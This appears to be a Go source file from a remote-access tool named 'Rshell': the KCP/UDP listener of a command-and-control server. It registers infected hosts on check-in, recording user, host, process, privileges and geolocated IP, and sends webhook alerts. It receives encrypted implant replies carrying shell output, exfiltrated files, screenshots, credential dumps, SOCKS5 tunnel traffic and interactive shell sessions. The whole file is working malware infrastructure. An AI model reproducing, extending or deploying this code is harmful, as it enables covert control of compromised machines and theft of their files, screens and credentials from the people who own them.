package kcp

import (
	"Rshell/pkg/command"
	"Rshell/pkg/connection"
	"Rshell/pkg/database"
	"Rshell/pkg/encrypt"
	"Rshell/pkg/interactive"
	"Rshell/pkg/logger"
	"Rshell/pkg/qqwry"
	"Rshell/pkg/utils"
	"Rshell/pkg/webhooks"
	"bufio"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/xtaci/kcp-go/v5"
)

// KCPClient KCP客户端结构
type KCPClient struct {
	Session       *kcp.UDPSession
	UID           string
	WriteMu       sync.Mutex
	StopChan      chan struct{}
	LastHeartbeat time.Time
	TimeoutCount  int
	IsClosed      bool
	CloseOnce     sync.Once
	Reader        *bufio.Reader
}

// KCPServer KCP服务器结构
type KCPServer struct {
	Listener net.Listener
	StopChan chan struct{}
}

// KCPClientManager KCP客户端管理器
type KCPClientManager struct {
	Clients map[string]*KCPClient
	Mu      sync.RWMutex
}

var (
	globalKCPClientManager = &KCPClientManager{
		Clients: make(map[string]*KCPClient),
	}
)

// 安全分割OS信息函数
func safeSplitOSInfo(osInfo string) (hostName, userName, processName string) {
	if osInfo == "" {
		return "Unknown", "Unknown", "Unknown"
	}

	parts := strings.SplitN(osInfo, "\t", 3)
	switch len(parts) {
	case 3:
		return parts[0], parts[1], parts[2]
	case 2:
		return parts[0], parts[1], "Unknown"
	case 1:
		return parts[0], "Unknown", "Unknown"
	default:
		return "Unknown", "Unknown", "Unknown"
	}
}

// Add 添加客户端到管理器
func (cm *KCPClientManager) Add(uid string, client *KCPClient) {
	cm.Mu.Lock()
	defer cm.Mu.Unlock()
	cm.Clients[uid] = client
	logger.Info("KCP client added:", uid, "Total KCP clients:", len(cm.Clients))
}

// Remove 从管理器移除客户端
func (cm *KCPClientManager) Remove(uid string) {
	cm.Mu.Lock()
	defer cm.Mu.Unlock()
	if client, exists := cm.Clients[uid]; exists {
		if !client.IsClosed {
			client.Close()
		}
		delete(cm.Clients, uid)
		logger.Info("KCP client removed:", uid, "Total KCP clients:", len(cm.Clients))
	}
}

// Get 获取客户端
func (cm *KCPClientManager) Get(uid string) (*KCPClient, bool) {
	cm.Mu.RLock()
	defer cm.Mu.RUnlock()
	client, exists := cm.Clients[uid]
	return client, exists
}

// CloseAll 关闭所有客户端
func (cm *KCPClientManager) CloseAll() {
	cm.Mu.Lock()
	defer cm.Mu.Unlock()
	for uid, client := range cm.Clients {
		if !client.IsClosed {
			client.Close()
		}
		delete(cm.Clients, uid)
	}
	logger.Info("All KCP clients closed")
}

// Close 安全关闭KCP客户端
func (c *KCPClient) Close() {
	c.CloseOnce.Do(func() {
		c.IsClosed = true

		// 关闭停止通道
		if c.StopChan != nil {
			close(c.StopChan)
		}

		// 关闭KCP会话
		if c.Session != nil {
			c.Session.Close()
		}

		// 从全局管理器移除
		if c.UID != "" {
			globalKCPClientManager.Remove(c.UID)
		}

		// 从连接类型管理器移除
		connection.MuClientListenerType.Lock()
		delete(connection.ClientListenerType, c.UID)
		connection.MuClientListenerType.Unlock()

		// 更新数据库状态为离线
		if c.UID != "" {
			database.Engine.Where("uid = ?", c.UID).Update(&database.Clients{Online: "2"})
			logger.Info("KCP client marked as offline:", c.UID)
		}

		logger.Info("KCP connection closed for client:", c.UID)
	})
}

// Write 安全发送数据
func (c *KCPClient) Write(data []byte) error {
	c.WriteMu.Lock()
	defer c.WriteMu.Unlock()

	if c.IsClosed {
		return fmt.Errorf("connection closed")
	}

	if len(data) == 0 {
		return fmt.Errorf("empty data to write")
	}

	c.Session.SetWriteDeadline(time.Now().Add(10 * time.Second))
	_, err := c.Session.Write(data)
	return err
}

// WriteWithLength 发送带长度的消息
func (c *KCPClient) WriteWithLength(data []byte) error {
	if len(data) == 0 {
		return fmt.Errorf("empty data to write")
	}

	// 创建带长度的消息
	length := uint32(len(data))
	buf := make([]byte, 4+len(data))
	binary.BigEndian.PutUint32(buf[:4], length)
	copy(buf[4:], data)

	return c.Write(buf)
}

// startHeartbeatCheck 启动心跳检查
func (c *KCPClient) startHeartbeatCheck() {
	defer func() {
		if r := recover(); r != nil {
			logger.Error("KCP heartbeat checker panic recovered:", r, "client:", c.UID)
		}
	}()

	ticker := time.NewTicker(10 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			if c.IsClosed {
				return
			}

			// 检查心跳是否超时
			if time.Since(c.LastHeartbeat) > 30*time.Second {
				c.TimeoutCount++
				logger.Warn("KCP heartbeat timeout for client:", c.UID, "Timeout count:", c.TimeoutCount)

				if c.TimeoutCount >= 3 {
					logger.Info("Max KCP heartbeat timeout reached, closing connection for client:", c.UID)
					c.Close()
					return
				}
			}

		case <-c.StopChan:
			return
		}
	}
}

// HandleKCPConnection 处理KCP连接
func HandleKCPConnection(session *kcp.UDPSession) {
	remoteAddr := session.RemoteAddr()
	logger.Info("New KCP connection from:", remoteAddr)

	defer func() {
		if r := recover(); r != nil {
			logger.Error("KCP handler panic recovered:", r, "from:", remoteAddr)
		}
	}()

	// 创建客户端对象
	client := &KCPClient{
		Session:       session,
		StopChan:      make(chan struct{}),
		LastHeartbeat: time.Now(),
		IsClosed:      false,
		Reader:        bufio.NewReaderSize(session, 1024*1024), // 增加缓冲区大小
	}

	defer func() {
		// 确保连接被关闭
		client.Close()
		logger.Info("KCP handler finished for:", remoteAddr)
	}()

	// 设置KCP会话参数
	session.SetStreamMode(true)
	session.SetReadBuffer(16 * 1024 * 1024)
	session.SetWriteBuffer(16 * 1024 * 1024)

	// 增大窗口大小，适应大文件高速传输
	// 发送窗口和接收窗口可以根据带宽调整，建议 4096 起步
	session.SetWindowSize(4096, 4096)

	// 关键：关闭拥塞控制 (最后一个参数设为 1)
	// 这样可以保证在有丢包的情况下依然维持高吞吐
	session.SetNoDelay(1, 20, 2, 1)
	session.SetDeadline(time.Now().Add(60 * time.Second)) // 缩短超时时间

	// 主消息处理循环
	for {
		if client.IsClosed {
			break
		}

		// 重置读取超时
		session.SetReadDeadline(time.Now().Add(30 * time.Second))

		// 读取消息长度
		var length uint32
		err := binary.Read(client.Reader, binary.BigEndian, &length)
		if err != nil {
			if err == io.EOF {
				logger.Info("KCP client closed connection:", remoteAddr)
			} else if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				logger.Info("KCP read timeout for:", remoteAddr)
				continue
			} else {
				logger.Error("KCP error reading message length:", err, "from:", remoteAddr)
			}
			break
		}

		// 验证消息长度
		if length == 0 {
			logger.Warn("KCP received zero-length message from:", remoteAddr)
			continue
		}

		//if length > 10*1024*1024 { // 限制为10MB
		//	logger.Error("KCP message too large:", length, "from:", remoteAddr)
		//	break
		//}

		// 最小长度检查（至少需要4字节的消息类型）
		if length < 4 {
			logger.Error("KCP message length too short:", length, "from:", remoteAddr)
			break
		}

		// 读取消息内容
		message := make([]byte, length)
		bytesRead, err := io.ReadFull(client.Reader, message)
		if err != nil {
			if err == io.EOF {
				logger.Info("KCP client closed connection while reading:", remoteAddr)
			} else if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				logger.Info("KCP read content timeout for:", remoteAddr)
			} else {
				logger.Error("KCP error reading message content:", err, "from:", remoteAddr)
			}
			break
		}

		// 验证实际读取的字节数
		if uint32(bytesRead) != length {
			logger.Error("KCP message length mismatch, expected:", length, "actual:", bytesRead)
			break
		}

		// 解析消息类型 - 添加边界检查
		msgType := binary.BigEndian.Uint32(message[:4])

		// 处理消息
		switch msgType {
		case 1: // firstBlood
			if len(message) < 5 { // 至少需要类型+1字节数据
				logger.Error("KCP firstBlood message too short from:", remoteAddr)
				break
			}

			msg := message[4:]
			if len(msg) == 0 {
				logger.Error("KCP empty firstBlood payload from:", remoteAddr)
				break
			}

			tmpMetainfo, err := encrypt.DecodeBase64(msg)
			if err != nil {
				logger.Error("KCP DecodeBase64 failed:", err, "from:", remoteAddr)
				break
			}

			metainfo, err := encrypt.DecryptNormal(tmpMetainfo)
			if err != nil {
				logger.Error("KCP Decrypt failed:", err, "from:", remoteAddr)
				break
			}

			// 验证metainfo长度
			if len(metainfo) < 9 {
				logger.Error("KCP metainfo too short:", len(metainfo), "from:", remoteAddr)
				break
			}

			uid := encrypt.BytesToMD5(metainfo)
			client.UID = uid
			client.LastHeartbeat = time.Now()
			client.TimeoutCount = 0

			// 添加到全局管理器
			globalKCPClientManager.Add(uid, client)

			// 更新连接类型
			connection.MuClientListenerType.Lock()
			connection.ClientListenerType[uid] = "kcp"
			connection.MuClientListenerType.Unlock()

			// 启动心跳检查
			go client.startHeartbeatCheck()

			// 检查客户端是否已存在
			var existingClient database.Clients
			exists, _ := database.Engine.Where("uid = ?", uid).Get(&existingClient)

			if !exists { // FirstBlood
				if len(metainfo) < 9 {
					logger.Error("KCP metainfo too short for parsing from:", remoteAddr)
					break
				}
				publicKey := metainfo[:32]
				metainfo = metainfo[32:]
				processID := binary.BigEndian.Uint32(metainfo[:4])
				flag := int(metainfo[4])

				// 检查是否有足够字节解析IP
				if len(metainfo) < 9 {
					logger.Error("KCP metainfo insufficient for IP parsing from:", remoteAddr)
					break
				}

				ipInt := binary.LittleEndian.Uint32(metainfo[5:9])
				localIP := utils.Uint32ToIP(ipInt).String()

				// 安全地获取osInfo
				var osInfo string
				if len(metainfo) > 9 {
					osInfo = string(metainfo[9:])
				}

				// 使用安全分割函数
				hostName, UserName, processName := safeSplitOSInfo(osInfo)

				// 获取外网IP
				remoteAddrStr := session.RemoteAddr().String()
				externalIp, _, err := net.SplitHostPort(remoteAddrStr)
				if err != nil {
					externalIp = remoteAddrStr
				}
				if externalIp == "::1" {
					externalIp = "127.0.0.1"
				}

				// 验证IP地址
				if net.ParseIP(externalIp) == nil {
					logger.Error("KCP invalid external IP:", externalIp, "from:", remoteAddr)
					externalIp = "0.0.0.0"
				}

				address, _ := qqwry.GetLocationByIP(externalIp)

				currentTime := time.Now()
				timeFormat := "01-02 15:04"
				formattedTime := currentTime.Format(timeFormat)

				arch := "x86"

				if flag > 8 {
					UserName += "*"
					flag = flag - 8
				}
				if flag > 4 {
					arch = "x64"
				}

				// 验证数据有效性
				if processName == "" {
					processName = "Unknown"
				}
				if hostName == "" {
					hostName = "Unknown"
				}
				if UserName == "" {
					UserName = "Unknown"
				}

				// 创建新客户端记录
				c := database.Clients{
					Uid:        uid,
					FirstStart: formattedTime,
					ExternalIP: externalIp,
					InternalIP: localIP,
					Username:   UserName,
					Computer:   hostName,
					Process:    processName,
					Pid:        strconv.Itoa(int(processID)),
					Address:    address,
					Arch:       arch,
					Note:       "",
					Sleep:      "0",
					Online:     "1",
					Color:      "",
					PublicKey:  base64.StdEncoding.EncodeToString(publicKey[:]),
				}
				encrypt.PublicKeyMap[uid] = base64.StdEncoding.EncodeToString(publicKey[:])
				// 使用事务插入数据库
				sessionDB := database.Engine.NewSession()
				defer sessionDB.Close()

				if err := sessionDB.Begin(); err != nil {
					logger.Error("KCP failed to start transaction:", err)
					break
				}

				if _, err := sessionDB.Insert(&c); err != nil {
					sessionDB.Rollback()
					logger.Error("KCP failed to insert client:", err)
					break
				}

				if _, err := sessionDB.Insert(&database.Shell{Uid: uid, ShellContent: ""}); err != nil {
					sessionDB.Rollback()
					logger.Error("KCP failed to insert shell:", err)
					break
				}

				if _, err := sessionDB.Insert(&database.Notes{Uid: uid, Note: ""}); err != nil {
					sessionDB.Rollback()
					logger.Error("KCP failed to insert notes:", err)
					break
				}

				if err := sessionDB.Commit(); err != nil {
					logger.Error("KCP failed to commit transaction:", err)
				}

				// 发送Webhook通知
				go webhooks.NotifyOnline(c)

				logger.Info("New KCP client registered:", uid, "IP:", externalIp)
			} else {
				// 更新在线状态
				if _, err := database.Engine.Where("uid = ?", uid).Update(&database.Clients{Online: "1"}); err != nil {
					logger.Error("KCP failed to update client status:", err)
				}
				logger.Info("KCP client reconnected:", uid)
			}

		case 2: // otherMsg
			if len(message) < 8 { // 至少需要类型+4字节长度+部分数据
				logger.Error("KCP otherMsg message too short from:", remoteAddr)
				break
			}

			msg := message[4:]
			if len(msg) < 4 {
				logger.Error("KCP OtherMsg too short")
				break
			}

			metaLen := binary.BigEndian.Uint32(msg[:4])

			// 验证metaLen的合理性
			if metaLen > uint32(len(msg)-4) {
				logger.Error("KCP invalid meta length:", metaLen, "available:", len(msg)-4)
				break
			}

			if metaLen == 0 {
				logger.Error("KCP zero meta length")
				break
			}

			metaMsg := msg[4 : 4+metaLen]
			realMsg := msg[4+metaLen:]

			// 验证realMsg不为空
			if len(realMsg) == 0 {
				logger.Error("KCP empty real message")
				break
			}

			tmpMetainfo, err := encrypt.DecodeBase64(metaMsg)
			if err != nil {
				logger.Error("KCP DecodeBase64 failed:", err)
				break
			}

			metainfo, err := encrypt.DecryptNormal(tmpMetainfo)
			if err != nil {
				logger.Error("KCP Decrypt failed:", err)
				break
			}

			uid := encrypt.BytesToMD5(metainfo)

			// 检查客户端是否在线
			if _, exists := globalKCPClientManager.Get(uid); !exists {
				logger.Warn("KCP received message from offline client:", uid)
				break
			}

			dataBytes, err := encrypt.DecodeBase64(realMsg)
			if err != nil {
				logger.Error("KCP DecodeBase64 failed:", err)
				break
			}

			dataBytes, err = encrypt.Decrypt(dataBytes, uid)
			if err != nil {
				logger.Error("KCP first decrypt failed:", err)
				break
			}

			dataBytes, err = encrypt.Decrypt(dataBytes, uid)
			if err != nil {
				logger.Error("KCP second decrypt failed:", err)
				break
			}

			// 严格检查dataBytes长度
			if len(dataBytes) < 4 {
				logger.Error("KCP decrypted data too short:", len(dataBytes))
				break
			}

			replyTypeBytes := dataBytes[:4]
			data := dataBytes[4:]
			replyType := binary.BigEndian.Uint32(replyTypeBytes)

			switch replyType {
			case 0: // 命令行展示
				var shell database.Shell
				if _, err := database.Engine.Where("uid = ?", uid).Get(&shell); err == nil {
					// 限制数据长度，防止过大的日志
					var content string
					if len(data) > 10000 {
						content = string(data[:10000]) + "\n[Data truncated...]"
					} else {
						content = string(data) + "\n"
					}

					shell.ShellContent += content
					if _, err := database.Engine.Where("uid = ?", uid).Update(&shell); err != nil {
						logger.Error("KCP failed to update shell:", err)
					}
				}

			case 31: // 错误展示
				var shell database.Shell
				if _, err := database.Engine.Where("uid = ?", uid).Get(&shell); err == nil {
					// 限制数据长度，防止过大的日志
					var content string
					if len(data) > 10000 {
						content = string(data[:10000]) + "\n[Data truncated...]"
					} else {
						content = string(data)
					}

					shell.ShellContent += "!Error: " + content + "\n"
					if _, err := database.Engine.Where("uid = ?", uid).Update(&shell); err != nil {
						logger.Error("KCP failed to update shell:", err)
					}
				}

			case command.PS:
				if len(data) > 0 {
					command.VarPidQueue.Add(uid, string(data))
				}

			case command.FileBrowse:
				if len(data) > 0 {
					command.VarFileBrowserQueue.Add(uid, string(data))
				}

			case 22: // 文件下载第一条信息
				if len(data) < 8 { // 至少4字节长度+部分路径
					logger.Error("KCP file download info too short")
					break
				}

				fileLen := int(binary.BigEndian.Uint32(data[:4]))
				if len(data) < 5 { // 至少4字节长度+1字节路径
					logger.Error("KCP no file path in download info")
					break
				}

				filePath := string(data[4:])
				if filePath == "" {
					logger.Error("KCP empty file path")
					break
				}

				// 验证文件长度合理性
				if fileLen <= 0 {
					logger.Error("KCP invalid file length:", fileLen)
					break
				}

				// 使用安全路径函数
				fullPath, err := utils.GetSafeFilePath(uid, filePath)
				if err != nil {
					logger.Error("KCP security check failed:", err)
					break
				}

				// 确保下载目录存在
				downloadDir := filepath.Dir(fullPath)
				if err := os.MkdirAll(downloadDir, 0755); err != nil {
					logger.Error("KCP failed to create download directory:", err)
					break
				}

				// 更新数据库
				sql := `
UPDATE downloads
SET file_size = ?, downloaded_size = ?
WHERE uid = ? AND file_path = ?;
`
				_, err = database.Engine.QueryString(sql, fileLen, 0, uid, filePath)
				if err != nil {
					logger.Error("KCP database update failed:", err)
				}

				// 检查并删除已存在的文件
				if _, err := os.Stat(fullPath); err == nil {
					if err := os.Remove(fullPath); err != nil {
						logger.Error("KCP failed to remove existing file:", err)
						break
					}
				}

				// 创建新文件
				fp, err := os.OpenFile(fullPath, os.O_CREATE|os.O_TRUNC|os.O_WRONLY, 0644)
				if err != nil {
					logger.Error("KCP failed to create file:", err)
					break
				}
				fp.Close()

			case command.DOWNLOAD: // 文件下载
				if len(data) < 8 { // 至少4字节路径长度+部分路径+部分内容
					logger.Error("KCP download data too short")
					break
				}

				filePathLen := int(binary.BigEndian.Uint32(data[:4]))
				if len(data) < 4+filePathLen {
					logger.Error("KCP invalid file path length in download")
					break
				}

				if filePathLen == 0 {
					logger.Error("KCP zero file path length")
					break
				}

				filePath := string(data[4 : 4+filePathLen])
				fileContent := data[4+filePathLen:]

				// 使用安全路径函数
				fullPath, err := utils.GetSafeFilePath(uid, filePath)
				if err != nil {
					logger.Error("KCP security check failed:", err)
					break
				}

				// 使用事务更新数据库
				utils.Filelock.Lock()
				// 使用事务更新数据库
				var fileDownloads database.Downloads
				if _, err := database.Engine.Where("uid = ? AND file_path = ?", uid, filePath).Get(&fileDownloads); err == nil {
					fileDownloads.DownloadedSize += len(fileContent)
					database.Engine.Where("uid = ? AND file_path = ?", uid, filePath).Update(&fileDownloads)
				}
				utils.Filelock.Unlock()

				// 确保目录存在
				downloadDir := filepath.Dir(fullPath)
				if err := os.MkdirAll(downloadDir, 0755); err != nil {
					logger.Error("KCP failed to create download directory:", err)
					break
				}

				// 追加文件内容
				fp, err := os.OpenFile(fullPath, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
				if err != nil {
					logger.Error("KCP failed to open file:", err)
					break
				}
				defer fp.Close()

				if _, err := fp.Write(fileContent); err != nil {
					logger.Error("KCP failed to write file content:", err)
				}

			case command.DRIVES:
				if len(data) > 0 {
					drives := utils.GetExistingDrives(data)
					command.VarDrivesQueue.Add(uid, drives)
				}

			case command.FileContent:
				if len(data) < 8 { // 至少4字节路径长度+部分路径+部分内容
					logger.Error("KCP file content data too short")
					break
				}

				filePathLen := int(binary.BigEndian.Uint32(data[:4]))
				if len(data) < 4+filePathLen {
					logger.Error("KCP invalid file path length in file content")
					break
				}

				if filePathLen == 0 {
					logger.Error("KCP zero file path length")
					break
				}

				filePath := string(data[4 : 4+filePathLen])
				fileContent := data[4+filePathLen:]
				command.VarFileContentQueue.Add(uid, filePath, string(fileContent))

			case command.Socks5Data:
				if len(data) < 16 {
					logger.Error("KCP socks5 data too short")
					break
				}

				md5sign := data[:16]
				rawData := data[16:]
				command.VarSocks5Queue.Add(uid, fmt.Sprintf("%x", md5sign), string(rawData))
			case command.DUMP_DATA:
				database.HandleDumpData(uid, data)
				break
			case command.SCREENSHOT:				if len(data) == 0 {
					logger.Error("KCP empty screenshot data")
					break
				}
				screenshotDir := filepath.Join("Screenshots", uid)
				if err := os.MkdirAll(screenshotDir, 0755); err != nil {
					logger.Error("Failed to create screenshot directory:", err)
					break
				}
				fileName := fmt.Sprintf("%d_screenshot.png", time.Now().UnixNano())
				fullPath := filepath.Join(screenshotDir, fileName)
				if err := os.WriteFile(fullPath, data, 0644); err != nil {
					logger.Error("Failed to write screenshot:", err)
					break
				}
				database.Engine.Insert(&database.Screenshots{
					Uid:       uid,
					FileName:  fileName,
					FilePath:  fullPath,
					CreatedAt: time.Now().Unix(),
				})
				logger.Info("KCP screenshot saved:", fullPath)

			case command.WriteInteractieShell:
				sessionIDLen := int(binary.BigEndian.Uint32(data[:4]))

				sessionID := string(data[4 : 4+sessionIDLen])
				output := data[4+sessionIDLen:]

				interactive.SendOutputToSession(uid, sessionID, output)
			default:
				logger.Warn("KCP unknown reply type:", replyType)
			}

		case 3: // heartBeat
			if len(message) < 5 { // 至少需要类型+1字节数据
				logger.Error("KCP heartBeat message too short from:", remoteAddr)
				break
			}

			msg := message[4:]
			if len(msg) == 0 {
				logger.Error("KCP empty heartBeat payload from:", remoteAddr)
				break
			}

			tmpMetainfo, err := encrypt.DecodeBase64(msg)
			if err != nil {
				logger.Error("KCP DecodeBase64 failed:", err)
				break
			}

			metainfo, err := encrypt.DecryptNormal(tmpMetainfo)
			if err != nil {
				logger.Error("KCP Decrypt failed:", err)
				break
			}

			uid := encrypt.BytesToMD5(metainfo)

			// 更新心跳时间
			if c, exists := globalKCPClientManager.Get(uid); exists && !c.IsClosed {
				c.LastHeartbeat = time.Now()
				c.TimeoutCount = 0
			}

		default:
			logger.Warn("KCP unknown message type:", msgType, "from:", remoteAddr)
			break
		}
	}
}

// Cleanup 全局清理函数
func Cleanup() {
	logger.Info("Starting KCP cleanup...")
	globalKCPClientManager.CloseAll()
	logger.Info("KCP cleanup completed")
}

// GetClientStats 获取客户端统计信息
func GetClientStats() map[string]interface{} {
	globalKCPClientManager.Mu.RLock()
	defer globalKCPClientManager.Mu.RUnlock()

	stats := make(map[string]interface{})
	stats["total_kcp_clients"] = len(globalKCPClientManager.Clients)

	onlineCount := 0
	for _, client := range globalKCPClientManager.Clients {
		if !client.IsClosed {
			onlineCount++
		}
	}
	stats["online_kcp_clients"] = onlineCount

	return stats
}

// GetClient 获取指定KCP客户端
func GetClient(uid string) *KCPClient {
	if client, exists := globalKCPClientManager.Get(uid); exists && !client.IsClosed {
		return client
	}
	return nil
}

// SendToClient 向指定KCP客户端发送消息
func SendToClient(uid string, message []byte) error {
	client := GetClient(uid)
	if client == nil {
		return fmt.Errorf("KCP client not found or offline")
	}

	return client.Write(message)
}

// BroadcastToAll 广播消息给所有KCP客户端
func BroadcastToAll(message []byte) {
	if len(message) == 0 {
		logger.Error("KCP empty message for broadcast")
		return
	}

	globalKCPClientManager.Mu.RLock()
	defer globalKCPClientManager.Mu.RUnlock()

	successCount := 0
	failCount := 0

	for uid, client := range globalKCPClientManager.Clients {
		if !client.IsClosed {
			if err := client.Write(message); err != nil {
				logger.Error("KCP failed to broadcast to client:", uid, "Error:", err)
				failCount++
			} else {
				successCount++
			}
		}
	}

	logger.Info("KCP broadcast completed, success:", successCount, "failed:", failCount)
}
